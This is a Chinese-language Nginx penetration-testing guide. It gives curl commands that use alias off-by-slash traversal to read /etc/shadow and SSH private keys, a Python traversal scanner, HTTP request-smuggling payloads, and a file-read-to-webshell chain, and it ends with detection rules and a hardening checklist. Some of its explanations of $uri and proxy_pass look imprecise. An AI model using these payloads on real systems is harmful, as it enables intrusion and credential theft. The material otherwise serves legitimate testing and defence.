---
title: "Nginx 配置错误 / Alias Traversal / 请求走私 / 路径穿越 / CVE 漏洞链利用技术"
date: 2026-06-22T02:00:00+08:00
draft: false
weight: 104
description: "Nginx 反向代理渗透测试：配置错误攻击面、Alias Traversal (off-by-slash)、HTTP 请求走私、路径穿越 ACL 绕过、Resolver DNS 欺骗、CVE-2021-23017 / CVE-2022-41741 漏洞利用链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Nginx", "配置错误", "Alias Traversal", "请求走私", "路径穿越", "CVE-2021-23017", "反向代理安全", "渗透测试"]
---

## 0x00 攻击面总览

Nginx 是最流行的 Web 服务器/反向代理，配置错误可导致多种高危漏洞：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| HTTP | 80 | HTTP | 反向代理、静态文件服务 |
| HTTPS | 443 | HTTPS | TLS 终止、反向代理 |
| stub_status | 配置端口 | HTTP | 状态信息泄露 |
| Resolver | 内部 | DNS | DNS 欺骗（CVE-2021-23017） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Nginx 攻击面                                 │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │  Nginx :80/:443                                       │     │
│  │  反向代理 / 静态文件 / 负载均衡                         │     │
│  └──────────────────────┬───────────────────────────────┘     │
│                         │                                     │
│  攻击路径：                                                    │
│  ① 配置错误 → autoindex/server_tokens → 信息泄露              │
│  ② Alias Traversal (off-by-slash) → 目录穿越 → 文件读取       │
│  ③ 路径穿越 → ACL 绕过 → 访问受保护资源                        │
│  ④ HTTP 请求走私 → 绕过前端安全控制                            │
│  ⑤ Resolver DNS 欺骗 → SSRF / RCE (CVE-2021-23017)           │
│  ⑥ proxy_pass URI 陷阱 → 请求头注入                           │
│                                                               │
│  默认风险：                                                    │
│  • 配置错误是最常见的 Nginx 安全问题                            │
│  • Alias Traversal 在特定配置下可导致任意文件读取               │
│  • $uri 变量规范化可被用于 ACL 绕过                            │
│  • HTTP/2 降级可能导致请求走私                                  │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 80,443 \
  --script=http-title,http-server-header \
  -oN nginx_scan.txt <target>
```

**典型扫描结果**：

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Nginx 1.24.0
443/tcp open  https       Nginx 1.24.0
```

### 1.2 版本指纹

```bash
# 获取 Server 头
curl -sI "http://target/" | grep -i server
# Server: nginx/1.24.0

# stub_status 页面
curl -s "http://target/nginx_status"
# Active connections: 291
# server accepts handled requests
#  16630948 16630948 31070465

# 隐藏版本号
# server_tokens off;
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
server:"nginx"
product:"Nginx"

# FOFA
server="nginx"
app="Nginx"
```

---

## 0x02 配置错误攻击

### 2.1 server_tokens 信息泄露

```bash
# 如果 server_tokens on（默认）
curl -sI "http://target/" | grep -i server
# Server: nginx/1.24.0

# 泄露版本信息有助于 CVE 匹配
```

### 2.2 autoindex 目录列表

```bash
# 如果 autoindex on
curl -s "http://target/uploads/"
# 返回目录列表

# 搜索敏感文件
curl -s "http://target/uploads/" | grep -E "\.(key|pem|conf|bak|sql)"
```

### 2.3 proxy_pass URI 陷阱

```nginx
# 危险配置
location /api/ {
    proxy_pass http://backend/;  # 注意末尾的 /
}

# 攻击者可以注入请求头
# GET /api/@attacker.com HTTP/1.1
# Host: backend
# 可能导致请求头注入
```

### 2.4 $uri 变量滥用

```nginx
# 危险配置
location / {
    rewrite ^/(.*)$ /$1 permanent;
    # 或
    return 302 /$uri;
}

# $uri 会被 Nginx 规范化
# /%2e%2e/ 被规范化为 /../
# 可能导致路径穿越
```

### 2.5 error_page XSS

```nginx
# 危险配置
error_page 404 /404.html;
# 如果 404 页面包含请求路径
# 可能导致反射型 XSS
```

---

## 0x03 Alias Traversal (off-by-slash)

### 3.1 漏洞原理

当 `alias` 指令的路径缺少尾部斜杠时，攻击者可以穿越目录：

```nginx
# 漏洞配置
location /images/ {
    alias /home/user/images;  # 缺少尾部 /
}
```

### 3.2 漏洞利用

```bash
# 正常访问
curl "http://target/images/logo.png"
# 读取 /home/user/images/logo.png

# 目录穿越
curl "http://target/images../etc/passwd"
# 读取 /home/user/images/../etc/passwd = /etc/passwd

# 更多穿越
curl "http://target/images../etc/shadow"
curl "http://target/images../home/user/.ssh/id_rsa"
```

### 3.3 自动化检测

```bash
# 使用 Nginx Alias Traversal 检测脚本
python3 -c "
import requests
import sys

target = sys.argv[1]
paths = ['/images../etc/passwd', '/static../etc/passwd', '/assets../etc/passwd',
         '/uploads../etc/passwd', '/media../etc/passwd', '/files../etc/passwd']

for path in paths:
    r = requests.get(f'{target}{path}')
    if 'root:' in r.text:
        print(f'[+] VULNERABLE: {path}')
        print(r.text[:200])
        break
" "http://target"
```

---

## 0x04 路径穿越 — ACL 绕过

### 4.1 $uri 规范化绕过

```nginx
# ACL 配置
location /admin {
    deny all;
}

location / {
    proxy_pass http://backend;
}

# 攻击：使用编码绕过 ACL
curl "http://target/%2fadmin"
# $uri 被规范化为 /admin，但后端可能不识别
```

### 4.2 try_files 绕过

```nginx
# 配置
location / {
    try_files $uri $uri/ /index.html;
}

# 攻击：访问受保护文件
curl "http://target/.git/config"
# 如果 .git 目录存在，可能被 try_files 暴露
```

### 4.3 正则表达式绕过

```nginx
# 配置
location ~* \.(php|php5)$ {
    deny all;
}

# 攻击：使用大小写混合
curl "http://target/test.PhP"
# 某些系统上可能被解析为 PHP
```

---

## 0x05 HTTP 请求走私

### 5.1 CL.TE 走私

```http
POST / HTTP/1.1
Host: target
Content-Length: 47
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
Foo: bar
```

### 5.2 TE.CL 走私

```http
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target
Foo: bar

0

```

### 5.3 HTTP/2 降级走私

```bash
# HTTP/2 到 HTTP/1.1 降级时可能触发走私
curl -s --http2 "http://target/" \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked"
```

---

## 0x06 Resolver DNS 欺骗

### 6.1 CVE-2021-23017 — 堆溢出

| 属性 | 详情 |
|------|------|
| 影响版本 | Nginx 0.6.18 - 1.21.0, 1.20.1, 1.20.0 |
| CVSS | 7.7（High） |
| 类型 | 堆缓冲区溢出 / DNS 欺骗 |
| 根因 | Resolver 处理 DNS 响应时未正确验证长度 |

### 6.2 DNS 重绑定攻击

```nginx
# 配置中使用变量
location / {
    resolver 8.8.8.8;
    proxy_pass http://$host;
}

# 攻击者控制 DNS 响应
# 实现 SSRF 或 RCE
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2021-23017 | 堆溢出/DNS 欺骗 | 7.7 | Resolver 堆溢出 |
| CVE-2022-41741 | 内存损坏 | 7.8 | MP4 模块内存损坏 |
| CVE-2022-41742 | 内存损坏 | 7.8 | MP4 模块内存损坏 |
| CVE-2024-7347 | 缓冲区读取 | 5.3 | mp4 模块缓冲区读取越界 |
| CVE-2019-20372 | 请求走私 | 5.3 | HTTP 请求走私 |
| CVE-2023-44487 | DoS | 7.5 | HTTP/2 Rapid Reset |

---

## 0x08 高级利用技术

### 8.1 Alias Traversal → RCE 链

```bash
# 步骤 1：通过 Alias Traversal 读取应用配置
curl "http://target/images../var/www/html/config.php"

# 步骤 2：获取数据库凭据
# 步骤 3：通过数据库写入 WebShell
# 步骤 4：获得服务器 Shell
```

### 8.2 请求走私 → WAF 绕过

```bash
# 通过请求走私将恶意请求注入后端
# 绕过前端 WAF 的安全检查
```

### 8.3 缓存投毒

```bash
# 通过请求走私或路径穿越投毒缓存
# 其他用户获取缓存的恶意内容
```

### 8.4 PHP-FPM 攻击

```bash
# 如果 Nginx 配置错误导致 PHP 文件解析
curl "http://target/uploads/image.php/.php"
# 可能被解析为 PHP 执行
```

---

## 0x09 蓝队检测方案

### 9.1 网络层检测

```yaml
title: Nginx Alias Traversal 检测
id: nginx-alias-traversal
status: experimental
description: 检测 Nginx Alias Traversal 攻击特征
logsource:
  product: nginx
  service: access
detection:
  selection:
    uri|contains:
      - "../"
      - "..\\"
    uri|regex: '/[a-z]+\.\./'
  condition: selection
level: high
```

### 9.2 审计日志分析

```bash
# 监控 Alias Traversal 尝试
grep -E "\.\./" /var/log/nginx/access.log

# 监控请求走私特征
grep -E "(Content-Length.*Transfer-Encoding|Transfer-Encoding.*Content-Length)" /var/log/nginx/access.log

# 监控路径穿越尝试
grep -E "(%2e%2e|%252e%252e)" /var/log/nginx/access.log

# 监控异常状态码
grep -E " (400|403|404) " /var/log/nginx/access.log | head -50
```

### 9.3 加固清单

```
[ ] 隐藏版本号：server_tokens off;
[ ] 禁用目录列表：autoindex off;
[ ] 修复 Alias Traversal：确保 alias 路径有尾部 /
[ ] 避免使用 $uri 进行重定向
[ ] 配置 merge_slashes on;（默认）
[ ] 使用绝对路径配置 proxy_pass
[ ] 限制 resolver 使用（如不需要）
[ ] 升级至最新 Nginx 版本修补 CVE
[ ] 配置 HTTPS 并启用 HSTS
[ ] 在前面放置 WAF 检测请求走私
[ ] 启用审计日志并接入 SIEM
[ ] 监控异常路径和编码请求
[ ] 配置适当的 CORS 策略
[ ] 使用 Content-Security-Policy 防止 XSS
[ ] 定期审查 Nginx 配置
```

---

## 0x10 渗透测试检查清单

```
[ ] 端口扫描：80, 443
[ ] Nginx 版本检测（Server 头）
[ ] stub_status 信息泄露测试
[ ] autoindex 目录列表测试
[ ] Alias Traversal (off-by-slash) 测试
[ ] 路径穿越 ACL 绕过测试
[ ] $uri 规范化绕过测试
[ ] HTTP 请求走私测试（CL.TE / TE.CL）
[ ] HTTP/2 降级走私测试
[ ] Resolver DNS 欺骗测试
[ ] proxy_pass URI 注入测试
[ ] error_page XSS 测试
[ ] PHP-FPM 解析绕过测试
[ ] 缓存投毒测试
[ ] CVE 版本匹配
[ ] TLS/SSL 配置检查
[ ] 安全响应头检查
```

---

## 0x11 小结

Nginx 的攻击面以 **配置错误** 为核心。**Alias Traversal (off-by-slash)** 是最常见的漏洞之一，当 `alias` 路径缺少尾部斜杠时可实现目录穿越读取任意文件。`$uri` 变量规范化可被用于 ACL 绕过和路径穿越。HTTP 请求走私可通过 CL.TE/TE.CL 或 HTTP/2 降级实现。**CVE-2021-23017** 通过 Resolver DNS 欺骗实现堆溢出。蓝队应重点关注：修复 Alias 配置、避免 $uri 滥用、禁用不必要功能、升级至最新版本、启用审计日志、将审计日志接入 SIEM。
